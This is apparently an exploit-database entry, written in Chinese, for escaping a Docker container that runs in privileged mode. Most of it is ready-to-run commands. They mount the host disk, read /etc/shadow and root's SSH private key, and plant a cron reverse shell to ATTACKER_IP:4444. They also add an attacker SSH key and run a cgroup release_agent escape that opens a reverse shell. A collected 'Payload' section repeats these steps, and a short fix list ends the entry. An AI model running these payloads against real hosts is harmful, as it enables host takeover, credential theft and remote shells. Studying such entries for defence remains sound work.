---
id: DOCKER-PRIVILEGED-ESCAPE
title: Docker 特权容器逃逸
product: docker
vendor: Docker
version_affected: "all versions"
severity: CRITICAL
tags: [container_escape, privileged, rce, docker, 无需认证]
fingerprint: ["Docker", "docker", "privileged", "CapEff"]
---

## 漏洞描述

当Docker容器以 `--privileged=true` 特权模式运行时，容器可以访问宿主机所有设备。攻击者可挂载宿主机磁盘，读写宿主机任意文件，通过写入crontab或SSH key实现逃逸获取宿主机权限。

## 影响版本

- Docker 全版本（以 --privileged 运行的容器）

## 前置条件

- 已获取容器内命令执行权限
- 容器以 `--privileged=true` 特权模式运行

## 检测方法

在容器内判断是否为特权模式：

```bash
cat /proc/self/status | grep CapEff
# 特权模式: CapEff: 0000003fffffffff 或 0000001fffffffff
```

## 利用步骤

### 方法一：挂载宿主机磁盘

```bash
# 查看宿主机磁盘设备
fdisk -l

# 挂载宿主机根分区
mkdir /host && mount /dev/sda1 /host

# 读取宿主机敏感文件
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
```

### 方法二：写入crontab反弹shell

```bash
mkdir /host && mount /dev/sda1 /host

# Ubuntu/Debian
echo '* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/var/spool/cron/crontabs/root

# CentOS/RHEL
echo '* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/var/spool/cron/root
```

### 方法三：写入SSH公钥

```bash
mkdir /host && mount /dev/sda1 /host
echo 'ssh-rsa AAAAB3...' >> /host/root/.ssh/authorized_keys
```

### 方法四：notify_on_release逃逸（不需要mount）

```bash
# 找到可写的cgroup
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/w/cgroup.procs"
```

## Payload

```bash
# 方法一：挂载宿主机磁盘 + 写入SSH公钥
mkdir -p /host && mount /dev/sda1 /host
echo 'ATTACKER_SSH_PUBKEY' >> /host/root/.ssh/authorized_keys

# 方法二：挂载宿主机磁盘 + 写入crontab反弹shell
mkdir -p /host && mount /dev/sda1 /host
echo '* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/var/spool/cron/crontabs/root

# 方法三：notify_on_release逃逸（不依赖mount）
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
printf '#!/bin/sh\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/w/cgroup.procs"
```

## 验证方法

```bash
# 确认特权模式
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff 或 0000001fffffffff 表示特权模式

# 确认可访问宿主机磁盘设备
fdisk -l 2>/dev/null | grep -i "disk /dev/"
# 输出磁盘设备列表表示特权模式

# 确认可挂载宿主机文件系统
mkdir -p /tmp/hosttest && mount /dev/sda1 /tmp/hosttest 2>/dev/null && \
  ls /tmp/hosttest/etc/hostname && umount /tmp/hosttest
```

## 指纹确认

```bash
# 容器内检测
cat /proc/self/status | grep CapEff
ls /dev/sda*
fdisk -l 2>/dev/null
```

## 修复建议

1. 避免使用 `--privileged` 启动容器
2. 使用 `--cap-drop ALL --cap-add` 只添加必要的capabilities
3. 启用 User Namespace 隔离
